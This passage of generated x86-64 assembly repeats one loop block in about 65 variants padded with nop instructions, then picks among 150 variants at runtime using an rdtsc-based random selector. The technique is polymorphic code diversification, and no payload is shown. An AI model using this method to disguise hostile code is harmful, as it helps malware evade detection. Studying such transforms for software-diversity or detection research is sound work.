	jmp	.Lmain_win1_continue
## Variant 85
.Lmain_win1_var85:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 86
.Lmain_win1_var86:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 87
.Lmain_win1_var87:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 88
.Lmain_win1_var88:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 89
.Lmain_win1_var89:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 90
.Lmain_win1_var90:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 91
.Lmain_win1_var91:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
	nop
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 92
.Lmain_win1_var92:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 93
.Lmain_win1_var93:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 94
.Lmain_win1_var94:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 95
.Lmain_win1_var95:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 96
.Lmain_win1_var96:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 97
.Lmain_win1_var97:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 98
.Lmain_win1_var98:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 99
.Lmain_win1_var99:
	popq	%rax
	nop
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 100
.Lmain_win1_var100:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 101
.Lmain_win1_var101:
	popq	%rax
	nop
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 102
.Lmain_win1_var102:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 103
.Lmain_win1_var103:
	popq	%rax
	nop
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 104
.Lmain_win1_var104:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 105
.Lmain_win1_var105:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 106
.Lmain_win1_var106:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 107
.Lmain_win1_var107:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 108
.Lmain_win1_var108:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 109
.Lmain_win1_var109:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 110
.Lmain_win1_var110:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 111
.Lmain_win1_var111:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 112
.Lmain_win1_var112:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 113
.Lmain_win1_var113:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 114
.Lmain_win1_var114:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 115
.Lmain_win1_var115:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 116
.Lmain_win1_var116:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 117
.Lmain_win1_var117:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 118
.Lmain_win1_var118:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 119
.Lmain_win1_var119:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 120
.Lmain_win1_var120:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 121
.Lmain_win1_var121:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 122
.Lmain_win1_var122:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 123
.Lmain_win1_var123:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 124
.Lmain_win1_var124:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 125
.Lmain_win1_var125:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 126
.Lmain_win1_var126:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 127
.Lmain_win1_var127:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 128
.Lmain_win1_var128:
	popq	%rax
	nop
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 129
.Lmain_win1_var129:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 130
.Lmain_win1_var130:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win1_continue
## Variant 131
.Lmain_win1_var131:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 132
.Lmain_win1_var132:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 133
.Lmain_win1_var133:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 134
.Lmain_win1_var134:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 135
.Lmain_win1_var135:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 136
.Lmain_win1_var136:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 137
.Lmain_win1_var137:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 138
.Lmain_win1_var138:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 139
.Lmain_win1_var139:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 140
.Lmain_win1_var140:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	nop
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 141
.Lmain_win1_var141:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 142
.Lmain_win1_var142:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 143
.Lmain_win1_var143:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 144
.Lmain_win1_var144:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	nop
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 145
.Lmain_win1_var145:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 146
.Lmain_win1_var146:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 147
.Lmain_win1_var147:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 148
.Lmain_win1_var148:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 149
.Lmain_win1_var149:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
.Lmain_win1_continue:
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win0_var0
	cmpl	$1, %eax
	je	.Lmain_win0_var1
	cmpl	$2, %eax
	je	.Lmain_win0_var2
	cmpl	$3, %eax
	je	.Lmain_win0_var3
	cmpl	$4, %eax
	je	.Lmain_win0_var4
	cmpl	$5, %eax
	je	.Lmain_win0_var5
	cmpl	$6, %eax
	je	.Lmain_win0_var6
	cmpl	$7, %eax
	je	.Lmain_win0_var7
	cmpl	$8, %eax
	je	.Lmain_win0_var8
	cmpl	$9, %eax
	je	.Lmain_win0_var9
	cmpl	$10, %eax
	je	.Lmain_win0_var10
	cmpl	$11, %eax
	je	.Lmain_win0_var11
	cmpl	$12, %eax
	je	.Lmain_win0_var12
	cmpl	$13, %eax
	je	.Lmain_win0_var13
	cmpl	$14, %eax
	je	.Lmain_win0_var14
	cmpl	$15, %eax
	je	.Lmain_win0_var15
	cmpl	$16, %eax
	je	.Lmain_win0_var16
	cmpl	$17, %eax
	je	.Lmain_win0_var17
	cmpl	$18, %eax
	je	.Lmain_win0_var18
	cmpl	$19, %eax
	je	.Lmain_win0_var19
	cmpl	$20, %eax
	je	.Lmain_win0_var20
	cmpl	$21, %eax
	je	.Lmain_win0_var21
	cmpl	$22, %eax
	je	.Lmain_win0_var22
	cmpl	$23, %eax
	je	.Lmain_win0_var23
	cmpl	$24, %eax
	je	.Lmain_win0_var24
	cmpl	$25, %eax
	je	.Lmain_win0_var25
	cmpl	$26, %eax
	je	.Lmain_win0_var26
	cmpl	$27, %eax
	je	.Lmain_win0_var27
	cmpl	$28, %eax
	je	.Lmain_win0_var28
	cmpl	$29, %eax
	je	.Lmain_win0_var29
	cmpl	$30, %eax
	je	.Lmain_win0_var30
	cmpl	$31, %eax
	je	.Lmain_win0_var31
	cmpl	$32, %eax
	je	.Lmain_win0_var32
	cmpl	$33, %eax
	je	.Lmain_win0_var33
	cmpl	$34, %eax
	je	.Lmain_win0_var34
	cmpl	$35, %eax
	je	.Lmain_win0_var35
	cmpl	$36, %eax
	je	.Lmain_win0_var36
	cmpl	$37, %eax
	je	.Lmain_win0_var37
	cmpl	$38, %eax
	je	.Lmain_win0_var38
	cmpl	$39, %eax
	je	.Lmain_win0_var39
	cmpl	$40, %eax
	je	.Lmain_win0_var40
	cmpl	$41, %eax
	je	.Lmain_win0_var41
	cmpl	$42, %eax
	je	.Lmain_win0_var42
	cmpl	$43, %eax
	je	.Lmain_win0_var43
	cmpl	$44, %eax
	je	.Lmain_win0_var44
	cmpl	$45, %eax
	je	.Lmain_win0_var45
	cmpl	$46, %eax
	je	.Lmain_win0_var46
	cmpl	$47, %eax
	je	.Lmain_win0_var47
	cmpl	$48, %eax
	je	.Lmain_win0_var48
	cmpl	$49, %eax
	je	.Lmain_win0_var49
	cmpl	$50, %eax
	je	.Lmain_win0_var50
	cmpl	$51, %eax
	je	.Lmain_win0_var51
	cmpl	$52, %eax
	je	.Lmain_win0_var52
	cmpl	$53, %eax
	je	.Lmain_win0_var53
	cmpl	$54, %eax
	je	.Lmain_win0_var54
	cmpl	$55, %eax
	je	.Lmain_win0_var55
	cmpl	$56, %eax
	je	.Lmain_win0_var56
	cmpl	$57, %eax
	je	.Lmain_win0_var57
	cmpl	$58, %eax
	je	.Lmain_win0_var58
	cmpl	$59, %eax
	je	.Lmain_win0_var59
	cmpl	$60, %eax
	je	.Lmain_win0_var60
	cmpl	$61, %eax
	je	.Lmain_win0_var61
	cmpl	$62, %eax
	je	.Lmain_win0_var62
	cmpl	$63, %eax
	je	.Lmain_win0_var63
	cmpl	$64, %eax
	je	.Lmain_win0_var64
	cmpl	$65, %eax
	je	.Lmain_win0_var65
	cmpl	$66, %eax
	je	.Lmain_win0_var66
	cmpl	$67, %eax
	je	.Lmain_win0_var67
	cmpl	$68, %eax
	je	.Lmain_win0_var68
	cmpl	$69, %eax
	je	.Lmain_win0_var69
	cmpl	$70, %eax
	je	.Lmain_win0_var70
	cmpl	$71, %eax
	je	.Lmain_win0_var71
	cmpl	$72, %eax
	je	.Lmain_win0_var72
	cmpl	$73, %eax
	je	.Lmain_win0_var73
	cmpl	$74, %eax
	je	.Lmain_win0_var74
	cmpl	$75, %eax
	je	.Lmain_win0_var75
	cmpl	$76, %eax
	je	.Lmain_win0_var76
	cmpl	$77, %eax
	je	.Lmain_win0_var77
	cmpl	$78, %eax
	je	.Lmain_win0_var78
	cmpl	$79, %eax
	je	.Lmain_win0_var79
	cmpl	$80, %eax
	je	.Lmain_win0_var80
	cmpl	$81, %eax
	je	.Lmain_win0_var81
	cmpl	$82, %eax
	je	.Lmain_win0_var82
	cmpl	$83, %eax
	je	.Lmain_win0_var83
	cmpl	$84, %eax
	je	.Lmain_win0_var84
	cmpl	$85, %eax
	je	.Lmain_win0_var85
	cmpl	$86, %eax
	je	.Lmain_win0_var86
	cmpl	$87, %eax
	je	.Lmain_win0_var87
	cmpl	$88, %eax
	je	.Lmain_win0_var88
	cmpl	$89, %eax
	je	.Lmain_win0_var89
	cmpl	$90, %eax
	je	.Lmain_win0_var90
	cmpl	$91, %eax
	je	.Lmain_win0_var91
	cmpl	$92, %eax
	je	.Lmain_win0_var92
	cmpl	$93, %eax
	je	.Lmain_win0_var93
	cmpl	$94, %eax
	je	.Lmain_win0_var94
	cmpl	$95, %eax
	je	.Lmain_win0_var95
	cmpl	$96, %eax
	je	.Lmain_win0_var96
	cmpl	$97, %eax
	je	.Lmain_win0_var97
	cmpl	$98, %eax
	je	.Lmain_win0_var98
	cmpl	$99, %eax
	je	.Lmain_win0_var99
	cmpl	$100, %eax
	je	.Lmain_win0_var100
	cmpl	$101, %eax
	je	.Lmain_win0_var101
	cmpl	$102, %eax
	je	.Lmain_win0_var102
	cmpl	$103, %eax
	je	.Lmain_win0_var103
	cmpl	$104, %eax
	je	.Lmain_win0_var104
	cmpl	$105, %eax
	je	.Lmain_win0_var105
	cmpl	$106, %eax
	je	.Lmain_win0_var106
	cmpl	$107, %eax
	je	.Lmain_win0_var107
	cmpl	$108, %eax
	je	.Lmain_win0_var108
	cmpl	$109, %eax
	je	.Lmain_win0_var109
	cmpl	$110, %eax
	je	.Lmain_win0_var110
	cmpl	$111, %eax
	je	.Lmain_win0_var111
	cmpl	$112, %eax
	je	.Lmain_win0_var112
	cmpl	$113, %eax
	je	.Lmain_win0_var113
	cmpl	$114, %eax
	je	.Lmain_win0_var114
	cmpl	$115, %eax
	je	.Lmain_win0_var115
	cmpl	$116, %eax
	je	.Lmain_win0_var116
	cmpl	$117, %eax
